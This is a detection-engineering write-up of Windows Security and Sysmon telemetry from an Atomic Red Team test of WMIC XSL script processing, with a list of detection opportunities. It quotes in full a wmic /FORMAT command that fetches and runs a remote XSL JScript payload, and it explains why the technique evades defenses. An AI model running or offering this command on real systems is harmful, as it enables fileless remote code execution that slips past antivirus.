# T1220-4: XSL Script Processing — WMIC bypass using remote XSL file

## Technique Context

T1220 (XSL Script Processing) is a defense evasion technique that abuses Windows utilities capable of processing XSL stylesheets to execute embedded script code. WMIC's `/FORMAT` parameter accepts a stylesheet path — including remote URLs — and executes any script blocks found within it. This makes WMIC a living-off-the-land execution vehicle: the JScript or VBScript payload never touches disk in the conventional sense; it loads directly into WMIC's process from the remote XSL file.

Test T1220-4 uses `wmic process list /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"` to download and execute a remote XSL file containing a JScript payload. In the defended variant, Windows Defender blocked the execution; in this undefended variant, the technique runs without antivirus interference.

The technique is attractive to adversaries because WMIC is a signed Microsoft binary with a legitimate administrative purpose, the payload is retrieved from a remote URL rather than written to disk, and the execution occurs within WMIC's process rather than spawning a new scripting host. Defenders look for WMIC invocations with `/FORMAT` pointing to HTTP/HTTPS URLs and for `urlmon.dll` loading into WMIC, which would be responsible for the HTTP fetch.

## What This Dataset Contains

This dataset captures the full undefended execution of the WMIC remote XSL technique. With Defender disabled, WMIC successfully retrieves and processes the remote XSL stylesheet.

**Security EID 4688** documents the complete process chain. PowerShell (running as `NT AUTHORITY\SYSTEM`, logon ID `0x3E7`) spawns `cmd.exe` with the command line:

```
"cmd.exe" /c wmic process list /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"
```

`cmd.exe` in turn spawns `C:\Windows\System32\wbem\WMIC.exe` with the same FORMAT argument. Both process creation events are present with full command lines. Paired Security EID 4688 events also capture `whoami.exe` launched by PowerShell, part of the ART test framework pre-execution enumeration.

**Sysmon EID 1** confirms the process creation chain with hash data and parent process GUIDs. The cmd.exe spawn is tagged `technique_id=T1059.003,technique_name=Windows Command Shell` by the sysmon-modular rule set.

**Sysmon EID 7** (ImageLoad) provides the most distinctive artifact in this dataset: `urlmon.dll` loading into `powershell.exe`. The `urlmon.dll` load (`C:\Windows\System32\urlmon.dll`) indicates that URL handling code was invoked in the PowerShell process context. Nine total image load events document the .NET and PowerShell runtime DLL stack alongside this HTTP-related library. This specific load combination — PowerShell loading `urlmon.dll` in a session that spawned WMIC with a remote FORMAT URL — is a useful behavioral signal.

**Sysmon EID 8** (CreateRemoteThread) records `cmd.exe` creating a thread in an unknown process. This may reflect the XSL scripting engine or WMIC's internal execution mechanism as it processes the remote stylesheet content.

**Sysmon EID 10** (ProcessAccess) shows four process access events where PowerShell accessed `whoami.exe` and `cmd.exe` with `GrantedAccess 0x1FFFFF` — full access — consistent with the ART test framework monitoring spawned child processes.

**Sysmon EID 11** captures a file creation event for PowerShell profile data (`StartupProfileData-Interactive`).

**Sysmon EID 17** captures the PowerShell named pipe (`\PSHost.*.DefaultAppDomain.powershell`), indicating an interactive PowerShell session.

The PowerShell channel (107 events: 104 EID 4104 + 3 EID 4103) contains ART test framework boilerplate — `Set-StrictMode`, `Set-ExecutionPolicy Bypass`, and internal PS module error-handling stubs. No technique-specific PowerShell script block content appears here because WMIC executes JScript internally, not through the PowerShell engine.

**Compared to the defended variant** (20 Sysmon / 12 Security / 34 PowerShell): This undefended dataset has the same Sysmon count (20) and fewer Security events (5 vs. 12). The defended variant included Security EID 4689 process exit events with exit code `0xC0000022` (STATUS_ACCESS_DENIED) confirming Defender intervention. Here, the absence of that exit code and the presence of the WMIC process creation event without a Defender kill indicate the technique ran to completion. The PowerShell event count is much higher in the undefended run (107 vs. 34) likely because the full XSL execution completed, triggering additional PS logging.

## What This Dataset Does Not Contain

The dataset does not include a Sysmon EID 3 (NetworkConnect) event for WMIC's outbound HTTP request to `raw.githubusercontent.com`. If Sysmon network monitoring is enabled for WMIC, that connection to port 443 would confirm the download occurred. The actual XSL file content is not captured — there is no file write event for the downloaded stylesheet, as WMIC processes it in memory. No DNS resolution event for `raw.githubusercontent.com` is present in the collected channels. The specific JScript execution that occurred within WMIC's process is not visible in these logs; JScript execution within WMIC does not generate PowerShell or WScript-level logging.

The Security channel does not include EID 4689 (process exit) events in the samples, so the final exit code of WMIC is not directly observable here, though the absence of a `0xC0000022` exit code in the defended variant analysis implies clean completion.

## Assessment

This dataset delivers clean, undefended execution telemetry for the WMIC remote XSL technique. The defining artifact — `cmd.exe` spawning `WMIC.exe` with `/FORMAT:"https://..."` — is fully captured in both Security EID 4688 and Sysmon EID 1. The `urlmon.dll` image load in Sysmon EID 7 provides a secondary behavioral indicator that is directly associated with the HTTP retrieval step. The Sysmon EID 8 CreateRemoteThread event is an unusual artifact worth preserving, potentially reflecting the XSL scripting engine's execution mechanics inside WMIC.

This is a strong dataset for training detections against WMIC's remote XSL abuse pattern without Defender noise.

## Detection Opportunities Present in This Data

- **Security EID 4688**: `WMIC.exe` command line containing `/FORMAT:` with an `https://` URL is a direct and high-confidence indicator. Any HTTP/HTTPS path in a WMIC `/FORMAT` argument is anomalous in enterprise environments.
- **Security EID 4688**: `cmd.exe` with a command line that passes a remote URL to `wmic` via `/FORMAT` — the full chain from PowerShell through cmd.exe to WMIC is captured.
- **Sysmon EID 7**: `urlmon.dll` loading into `powershell.exe` in a session that spawned WMIC with a remote FORMAT argument. `urlmon.dll` loading into non-browser processes is unusual.
- **Sysmon EID 8**: CreateRemoteThread from `cmd.exe` into an unknown target process during a WMIC remote XSL execution is an anomalous event worth alerting on.
- **Sysmon EID 1**: Parent-child chain of `powershell.exe` → `cmd.exe` → `wmic.exe` with `/FORMAT:https://` in the WMIC command line.
